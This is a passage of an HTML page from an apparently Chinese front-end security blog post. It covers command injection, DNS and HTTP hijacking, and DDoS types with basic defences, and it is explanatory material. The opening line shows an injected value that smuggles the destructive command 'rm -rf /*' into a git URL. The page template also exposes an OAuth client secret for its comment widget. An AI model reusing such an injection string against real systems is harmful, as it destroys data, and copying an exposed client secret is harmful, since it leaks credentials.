+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="请求劫持"><a href="#请求劫持" class="headerlink" title="请求劫持"></a>请求劫持</h3><ul>
+<li><p>DNS劫持, 顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的<br>ip</p>
+</li>
+<li><p>HTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了</p>
+</li>
+</ul>
+<h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>DDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。⽹<br>站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了瘫痪<br>服务的⽬的。</p>
+<p>其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承<br>受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个地<br>址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼就是<br>⼀⼤堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个⼈⽹站<br>没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。</p>
+<h4 id="常⻅攻击⽅式"><a href="#常⻅攻击⽅式" class="headerlink" title="常⻅攻击⽅式"></a>常⻅攻击⽅式</h4><ul>
+<li>SYN Flood</li>
+</ul>
+<p>此攻击通过向⽬标发送具有欺骗性源IP地址的⼤量TCP“初始连接请求”SYN数据包来利⽤TCP握<br>⼿。⽬标机器响应每个连接请求，然后等待握⼿中的最后⼀步，这⼀步从未发⽣过，耗尽了进程<br>中的⽬标资源。</p>
+<ul>
+<li>HTTP Flood</li>
+</ul>
+<p>此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - ⼤量HTTP请求泛滥服务器，<br>导致拒绝服务。</p>
+<h4 id="防御手段-1"><a href="#防御手段-1" class="headerlink" title="防御手段"></a>防御手段</h4><ul>
+<li>备份⽹站</li>
+</ul>
+<p>备份⽹站不⼀定是全功能的，如果能做到全静态浏览，就能满⾜需求。最低限度应该可以显示公告，告诉<br>⽤户，⽹站出了问题，正在全⼒抢修。</p>
+<ul>
+<li>HTTP 请求的拦截 ⾼防IP -靠谱的运营商 多个 Docker</li>
+</ul>
+<p>硬件 服务器 防⽕墙</p>
+<ul>
+<li>带宽扩容 + CDN</li>
+</ul>
+<p>提⾼犯罪成本</p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/">前端安全-1</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 xh 的个人博客">xh</a></p>
+        <p><span>发布时间:</span>2022年03月20日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年11月16日 - 00时34分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/" title="前端安全-1">https://cxid.gitee.io/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cxid.gitee.io/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/　　作者: xh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2022/03/25/IOS%E5%AF%B9%E6%97%B6%E9%97%B4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%9A%84bug/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          IOS对时间字符串处理的bug
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/10/TypeScript%E7%B1%BB%E5%9E%8B%E7%BC%96%E5%86%99%E6%8F%90%E5%8D%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">TypeScript类型编写提升</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%AE%9E%E6%96%BD%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">1.</span> <span class="toc-text">XSS实施和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">XSS攻击分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E9%98%B2%E8%8C%83%E6%89%8B%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">XSS防范手段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E5%AE%9E%E6%96%BD%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">2.</span> <span class="toc-text">CSRF实施和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.1.</span> <span class="toc-text">CSRF的危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="toc-number">2.2.</span> <span class="toc-text">防御手段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%96%BD%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">3.</span> <span class="toc-text">点击劫持实施和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">SQL注入和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-number">4.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OS%E6%B3%A8%E5%85%A5%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">OS注入和防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">请求劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DDOS"><span class="toc-number">7.</span> <span class="toc-text">DDOS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E2%BB%85%E6%94%BB%E5%87%BB%E2%BD%85%E5%BC%8F"><span class="toc-number">7.1.</span> <span class="toc-text">常⻅攻击⽅式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5-1"><span class="toc-number">7.2.</span> <span class="toc-text">防御手段</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<!-- 
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+ -->
+
+<script src="/js/require.js"></script>
+
+
+<script src="https://cdn.staticfile.org/jquery/1.9.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <!-- giteement评论系统 -->
+
+<div id="giteementDiv"></div>
+<link rel="stylesheet" href="https://giteement.oss-cn-beijing.aliyuncs.com/default.css">
+<script src="https://giteement.oss-cn-beijing.aliyuncs.com/giteement.browser.js"></script>
+
+<script type="text/javascript">
+  var giteement = new Giteement({
+    id: window.location.pathname,
+    owner: 'cxid',
+    repo: 'comment',
+    backcall_uri: 'https://cxid.gitee.io',
+    oauth_uri: 'https://cors-anywhere.herokuapp.com/https://gitee.com/oauth/token',
+    oauth: {
+      client_id: '8ee4f1dfd68916ea866a96bfc7d86e4d01b32e5bcd18c8d0cf06318584689723',
+      client_secret: '35dd05443654ee53bee1c899eb9dad9dd3ee3f6674beb0b9025e09fc239c877e'
+    },
+  });
+  giteement.render('giteementDiv');
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/03/25/IOS%E5%AF%B9%E6%97%B6%E9%97%B4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%9A%84bug/" title="上一篇: IOS对时间字符串处理的bug">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/03/10/TypeScript%E7%B1%BB%E5%9E%8B%E7%BC%96%E5%86%99%E6%8F%90%E5%8D%87/" title="下一篇: TypeScript类型编写提升">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/docker%E9%83%A8%E7%BD%B2vue%E9%A1%B9%E7%9B%AE/">docker部署前端项目(以vue为例)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/23/vue-router%E7%9A%84next()/">vue-router的next()</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/10/vue3-hightlight%E7%BB%84%E4%BB%B6%E8%AE%BE%E8%AE%A1/">vue3-highlight组件实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/23/vue3-%E4%BD%BF%E7%94%A8watch%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%9C%E8%A5%BF-%E8%B8%A9%E5%9D%91watch%E7%9B%91%E5%90%AC%E4%B8%8D%E5%88%B0/">vue3-watch踩坑-无法监听数据变化</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/02/vite%E6%89%93%E5%8C%85%E4%B9%8BcssCodeSplit/">vite打包组件库时，设置cssCodeSplit不生效</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/25/vue3%E6%94%AF%E6%8C%81jsx%E8%AF%AD%E6%B3%95/">vue3支持jsx语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/10/%E7%BC%96%E7%A8%8B-%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E8%BD%AC%E4%B8%AD%E6%96%87/">阿拉伯数字转中文</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8/">数据结构-链表</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%98%9F%E5%88%97/">数据结构-队列</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88/">数据结构-栈</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/%E9%95%BF%E5%88%97%E8%A1%A8%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/">长列表性能优化方案</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/">浏览器渲染原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/25/html-iframe%E7%A6%81%E6%AD%A2%E4%B8%8B%E8%BD%BDpdf/">iframe预览pdf，禁止下载</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/01/vue-cli4.x%E5%A4%84%E7%90%86svg%E4%BB%A5%E5%8F%8A%E5%8E%BB%E9%99%A4%E6%B3%A8%E9%87%8A/">Vue-cli4.x的一些打包优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/24/node-SSE%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/">node-SSE简单实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/20/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%8F%92%E4%BB%B6%E8%B0%83%E7%A0%94%E8%AE%B0%E5%BD%95/">富文本插件调研记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/30/js-%E4%BB%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E4%BD%9C%E4%B8%BA%E5%AD%97%E8%8A%82%E9%95%BF%E5%BA%A6%E5%B8%A6%E6%9D%A5bug/">js-以字符串长度作为字节长度带来bug</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/H5%E8%BD%AF%E9%94%AE%E7%9B%98%E5%BC%B9%E8%B5%B7%E5%A4%84%E7%90%86/">H5软键盘弹起处理</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/27/IOS%E4%B8%8Baudio%E7%9A%84%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%E5%B1%9E%E6%80%A7%E6%98%AF%E6%97%A0%E6%95%88%E7%9A%84/">IOS的audio标签不允许自动播放</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/25/IOS%E5%AF%B9%E6%97%B6%E9%97%B4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%9A%84bug/">IOS对时间字符串处理的bug</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81/">前端安全-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/10/TypeScript%E7%B1%BB%E5%9E%8B%E7%BC%96%E5%86%99%E6%8F%90%E5%8D%87/">TypeScript类型编写提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/12/canvas%E9%9D%9E%E9%9B%B6%E7%8E%AF%E7%BB%95%E8%A7%84%E5%88%99/">canvas的非零环绕规则</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/10/canvas%E8%B7%AF%E5%BE%84%E4%BA%8E%E5%AD%90%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/">canvas路径与子路径</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/09/TypeScript%E9%85%8D%E7%BD%AE%E8%B7%AF%E5%BE%84%E9%97%B4%E5%86%99/">TypeScript配置路径简称</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/28/TypeScript-Event%E7%9A%84%E7%B1%BB%E5%9E%8B%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/">TypeScript-Event类型的简单记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/20/TypeScript%E8%8E%B7%E5%8F%96%E6%9E%9A%E4%B8%BE%E7%9A%84%E7%B1%BB%E5%9E%8B/">TypeScript获取枚举的类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/21/vue3%E8%8E%B7%E5%8F%96%E7%BB%84%E4%BB%B6%E5%AE%9E%E4%BE%8B/">vue3获取组件实例</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/15/vue3%E5%86%85%E7%BD%AE%E7%BB%84%E4%BB%B6component%E4%BD%BF%E7%94%A8/">vue3内置组件component使用语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/03/vue3-ts%E9%98%B2%E6%8A%96/">vue3防抖指令</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/18/es6-%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/">箭头函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/12/vue-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/">vue性能优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/30/%E5%89%8D%E7%AB%AF-%E5%AD%98%E5%82%A8/">前端存储数据的方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/21/node-%E6%9C%8D%E5%8A%A1%E6%94%AF%E6%8C%81gzip/">node服务支持gzip压缩</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/10/node-cli%E6%9E%84%E5%BB%BA%E8%BF%87%E7%A8%8B/">node构建cli过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/30/webpack%E8%87%AA%E5%AE%9A%E4%B9%89loader%E5%92%8Cplugin/">webpack自定义loader和plugin</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/07/webpack-%E6%89%93%E5%8C%85%E4%BC%98%E5%8C%96/">webpack 的 打包优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/24/webpack-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">webpack 的 基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E7%BD%91%E7%BB%9C-HTTP%E7%BC%93%E5%AD%98/">用Node静态服务器，掌握HTTP缓存</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/%E7%BD%91%E7%BB%9C-HTTP-get%E5%92%8Cpost/">HTTP的get和post的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/%E7%BD%91%E7%BB%9C-HTTP-referer/">HTTP请求报头中的referer</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/26/%E7%BD%91%E7%BB%9C-HTTP/">HTTP协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%BD%91%E7%BB%9C-DNS%E5%AF%BB%E5%9D%80%E8%BF%87%E7%A8%8B/">DNS寻址过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%BD%91%E7%BB%9C-TCP/">TCP协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/19/js-toLocalDateString%E5%9C%A8ie%E4%B8%8B%E5%92%8Cgg%E7%9A%84%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%90%8C/">toLocalDateString在ie下和gg的显示不同</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/19/%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B/">计算机网络分层模型</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/05/webpack%E7%9A%84sourceMap%E5%BA%94%E7%94%A8/">webpack 的 sourcemap 应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/git%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E9%A6%96%E5%AD%97%E6%AF%8D%E4%B8%8D%E6%8F%90%E7%A4%BA%E6%96%87%E4%BB%B6%E5%B7%B2%E4%BF%AE%E6%94%B9/">修改文件首字母的大小写，不提示新增/删除</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/22/vue%E7%9A%84v-for%E4%B8%8Ev-ifyou%E4%BC%98%E5%85%88%E7%BA%A7/">从源码分析v-for与v-if的优先级问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/10/%E5%AF%B9Element%E7%9A%84el-form%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%80%83/">对Element的el-form的设计思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/28/vue%E4%B8%ADjsx%E5%BA%94%E7%94%A8/">vue中jsx应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/20/vue-router%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">vue-router源码浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/04/vue%E7%9A%84mixin%E5%90%88%E5%B9%B6%E7%AD%96%E7%95%A5/">Vue的mixin合并策略</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/08/vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/">Vue组件间通信的方式总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/01/js%E5%A6%82%E4%BD%95%E8%A2%AB%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">js如何被解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/01/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">垃圾回收机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/12/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/">事件循环机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/04/%E4%BD%9C%E7%94%A8%E5%9F%9F&%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87/">作用域、作用域链和变量提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/15/%E9%97%AD%E5%8C%85/">闭包</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/28/js%E5%B8%B8%E7%94%A8%E7%BB%A7%E6%89%BF/">js常用继承</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/20/%E8%8A%82%E6%B5%81%E5%92%8C%E9%98%B2%E6%8A%96/">防抖和节流</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/18/call%E3%80%81apply%E5%92%8Cbind/">call、apply和bind</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/15/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/">js原型和原型链</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/14/hexo/">hexo 搭建博客</a></li></ul>
+    <!-- <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script> -->
+    
+<script src="/js/require.js"></script>
+
+    
+<script src="https://cdn.staticfile.org/jquery/1.9.1/jquery.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2024 John Doe
+            </div>
+            <div class="footer-right">
+                <!-- <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman -->
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >到访: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">阅读: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <!-- 
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+ -->
+
+<script src="/js/require.js"></script>
+
+
+<script src="https://cdn.staticfile.org/jquery/1.9.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+    <!--动态线条背景-->
+<!-- <script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="https://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script> -->
+</body>
+</html>
